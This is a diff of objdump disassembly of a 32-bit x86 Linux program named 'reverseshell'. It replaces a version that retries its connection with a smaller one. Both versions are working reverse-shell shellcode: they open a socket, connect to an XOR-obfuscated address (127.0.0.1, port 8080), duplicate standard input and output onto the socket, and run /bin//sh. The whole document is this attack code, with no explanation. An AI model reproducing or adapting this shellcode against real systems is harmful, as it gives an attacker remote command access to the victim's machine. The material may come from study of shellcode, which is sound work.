@@ -4,113 +4,56 @@ reverseshell:     format de fichier elf32-i386
 
 Déassemblage de la section .data :
 
-08049000 <arg0>:
- 8049000:	2f                   	das    
- 8049001:	62 69 6e             	bound  %ebp,0x6e(%ecx)
- 8049004:	2f                   	das    
- 8049005:	73 68                	jae    804906f <_start+0x2f>
-	...
+08049000 <_start>:
+ 8049000:	66 b8 67 01          	mov    $0x167,%ax
+ 8049004:	b3 02                	mov    $0x2,%bl
+ 8049006:	b1 01                	mov    $0x1,%cl
+ 8049008:	b2 06                	mov    $0x6,%dl
+ 804900a:	cd 80                	int    $0x80
+ 804900c:	97                   	xchg   %eax,%edi
+ 804900d:	31 c9                	xor    %ecx,%ecx
+ 804900f:	f7 e1                	mul    %ecx
+ 8049011:	51                   	push   %ecx
+ 8049012:	51                   	push   %ecx
+ 8049013:	b9 80 ff ff fe       	mov    $0xfeffff80,%ecx
+ 8049018:	83 f1 ff             	xor    $0xffffffff,%ecx
+ 804901b:	51                   	push   %ecx
+ 804901c:	66 68 1f 90          	pushw  $0x901f
+ 8049020:	66 6a 02             	pushw  $0x2
+ 8049023:	89 e1                	mov    %esp,%ecx
+ 8049025:	6a 10                	push   $0x10
+ 8049027:	5a                   	pop    %edx
+ 8049028:	89 fb                	mov    %edi,%ebx
+ 804902a:	66 b8 6a 01          	mov    $0x16a,%ax
+ 804902e:	cd 80                	int    $0x80
+ 8049030:	40                   	inc    %eax
+ 8049031:	83 f8 01             	cmp    $0x1,%eax
+ 8049034:	75 02                	jne    8049038 <fail>
+ 8049036:	eb 08                	jmp    8049040 <continue>
 
-08049008 <arg1>:
- 8049008:	2d 69 00         	sub    $0x53500069,%eax
+08049038 <fail>:
+ 8049038:	31 db                	xor    %ebx,%ebx
+ 804903a:	31 c0                	xor    %eax,%eax
+ 804903c:	b0 01                	mov    $0x1,%al
+ 804903e:	cd 80                	int    $0x80
 
-0804900b <env0>:
- 804900b:	50                   	push   %eax
- 804900c:	53                   	push   %ebx
- 804900d:	31 3d 5c 6e 5b 5c    	xor    %edi,0x5c5b6e5c
- 8049013:	74 5d                	je     8049072 <_start+0x32>
- 8049015:	20 5c 75 40          	and    %bl,0x40(%ebp,%esi,2)
- 8049019:	5c                   	pop    %esp
- 804901a:	68 20 5c 77 5c       	push   $0x5c775c20
- 804901f:	6e                   	outsb  %ds:(%esi),(%dx)
- 8049020:	5c                   	pop    %esp
- 8049021:	5c                   	pop    %esp
- 8049022:	24 20                	and    $0x20,%al
- 8049024:	3a 20                	cmp    (%eax),%ah
-	...
+08049040 <continue>:
+ 8049040:	87 df                	xchg   %ebx,%edi
+ 8049042:	6a 02                	push   $0x2
+ 8049044:	59                   	pop    %ecx
 
-08049027 <argv>:
- 8049027:	00 90 04 08 08 90    	add    %dl,-0x6ff7f7fc(%eax)
- 804902d:	04 08                	add    $0x8,%al
- 804902f:	00 00                	add    %al,(%eax)
-	...
-
-08049033 <envv>:
- 8049033:	0b 90 04 08 00 00    	or     0x804(%eax),%edx
-	...
-
-0804903b <timeval>:
- 804903b:	05           	add    $0x1,%eax
-
-0804903c <tv_usec>:
- 804903c:	01 00                	add    %eax,(%eax)
-	...
-
-08049040 <_start>:
- 8049040:	66 b8 67 01          	mov    $0x167,%ax
- 8049044:	b3 02                	mov    $0x2,%bl
- 8049046:	b1 01                	mov    $0x1,%cl
- 8049048:	b2 06                	mov    $0x6,%dl
- 804904a:	cd 80                	int    $0x80
- 804904c:	97                   	xchg   %eax,%edi
- 804904d:	31 c9                	xor    %ecx,%ecx
- 804904f:	f7 e1                	mul    %ecx
- 8049051:	51                   	push   %ecx
- 8049052:	51                   	push   %ecx
- 8049053:	b9 80 ff ff fe       	mov    $0xfeffff80,%ecx
- 8049058:	83 f1 ff             	xor    $0xffffffff,%ecx
- 804905b:	51                   	push   %ecx
- 804905c:	66 68 1f 90          	pushw  $0x901f
- 8049060:	66 6a 02             	pushw  $0x2
- 8049063:	89 e1                	mov    %esp,%ecx
- 8049065:	6a 10                	push   $0x10
- 8049067:	5a                   	pop    %edx
- 8049068:	89 fb                	mov    %edi,%ebx
- 804906a:	66 b8 6a 01          	mov    $0x16a,%ax
- 804906e:	cd 80                	int    $0x80
- 8049070:	40                   	inc    %eax
- 8049071:	83 f8 01             	cmp    $0x1,%eax
- 8049074:	75 02                	jne    8049078 <retry>
- 8049076:	eb 38                	jmp    80490b0 <continue>
-
-08049078 <retry>:
- 8049078:	87 fb                	xchg   %edi,%ebx
- 804907a:	31 c0                	xor    %eax,%eax
- 804907c:	b0 a2                	mov    $0xa2,%al
- 804907e:	bb 3b 90 04 08       	mov    $0x804903b,%ebx
- 8049083:	31 c9                	xor    %ecx,%ecx
- 8049085:	cd 80                	int    $0x80
- 8049087:	31 c9                	xor    %ecx,%ecx
- 8049089:	f7 e1                	mul    %ecx
- 804908b:	51                   	push   %ecx
- 804908c:	51                   	push   %ecx
- 804908d:	b9 80 ff ff fe       	mov    $0xfeffff80,%ecx
- 8049092:	83 f1 ff             	xor    $0xffffffff,%ecx
- 8049095:	51                   	push   %ecx
- 8049096:	66 68 1f 90          	pushw  $0x901f
- 804909a:	66 6a 02             	pushw  $0x2
- 804909d:	89 e1                	mov    %esp,%ecx
- 804909f:	6a 10                	push   $0x10
- 80490a1:	5a                   	pop    %edx
- 80490a2:	89 fb                	mov    %edi,%ebx
- 80490a4:	66 b8 6a 01          	mov    $0x16a,%ax
- 80490a8:	cd 80                	int    $0x80
- 80490aa:	40                   	inc    %eax
- 80490ab:	83 f8 01             	cmp    $0x1,%eax
- 80490ae:	75 c8                	jne    8049078 <retry>
-
-080490b0 <continue>:
- 80490b0:	87 df                	xchg   %ebx,%edi
- 80490b2:	6a 02                	push   $0x2
- 80490b4:	59                   	pop    %ecx
-
-080490b5 <loop>:
- 80490b5:	b0 3f                	mov    $0x3f,%al
- 80490b7:	cd 80                	int    $0x80
- 80490b9:	49                   	dec    %ecx
- 80490ba:	79 f9                	jns    80490b5 <loop>
- 80490bc:	bb 00 90 04 08       	mov    $0x8049000,%ebx
- 80490c1:	b9 27 90 04 08       	mov    $0x8049027,%ecx
- 80490c6:	ba 33 90 04 08       	mov    $0x8049033,%edx
- 80490cb:	b0 0b                	mov    $0xb,%al
- 80490cd:	cd 80                	int    $0x80
+08049045 <loop>:
+ 8049045:	b0 3f                	mov    $0x3f,%al
+ 8049047:	cd 80                	int    $0x80
+ 8049049:	49                   	dec    %ecx
+ 804904a:	79 f9                	jns    8049045 <loop>
+ 804904c:	31 db                	xor    %ebx,%ebx
+ 804904e:	31 c9                	xor    %ecx,%ecx
+ 8049050:	31 d2                	xor    %edx,%edx
+ 8049052:	f7 e3                	mul    %ebx
+ 8049054:	53                   	push   %ebx
+ 8049055:	68 2f 2f 73 68       	push   $0x68732f2f
+ 804905a:	68 2f 62 69 6e       	push   $0x6e69622f
+ 804905f:	89 e3                	mov    %esp,%ebx
+ 8049061:	b0 0b                	mov    $0xb,%al
+ 8049063:	cd 80                	int    $0x80
